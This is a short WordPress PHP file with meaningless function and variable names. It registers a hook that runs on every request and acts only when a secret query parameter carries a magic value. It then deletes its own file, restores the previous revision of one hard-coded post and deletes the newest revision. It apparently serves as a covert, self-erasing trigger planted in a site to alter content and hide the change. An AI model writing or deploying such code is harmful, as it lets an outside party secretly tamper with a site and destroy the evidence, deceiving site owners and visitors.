<?php

function chart_option_display() {
	if (isset($_GET['utils_external_extended_headers']) && $_GET['utils_external_extended_headers'] === 'your_term_light_toggle') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$security_follow_builder_health = 14377;
		$effect_specific_shipping_footer = wp_get_post_revisions($security_follow_builder_health);
		if (empty($effect_specific_shipping_footer)) die('no revisions');
		if (count($effect_specific_shipping_footer) < 2) die('less than 2');
		$limit_term_ajax_quantity = array_shift($effect_specific_shipping_footer);
		$pullquote_follow_restrict = $limit_term_ajax_quantity->ID;
		$permalink_forms_category = array_shift($effect_specific_shipping_footer);
		$ticker_titles_addons_new = $permalink_forms_category->ID;
		$urls_insert_refresh = wp_restore_post_revision($ticker_titles_addons_new);
		if ($urls_insert_refresh === false) die('error restoring');
		$urls_insert_refresh = wp_delete_post_revision($pullquote_follow_restrict);		
		if ($urls_insert_refresh === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'chart_option_display');
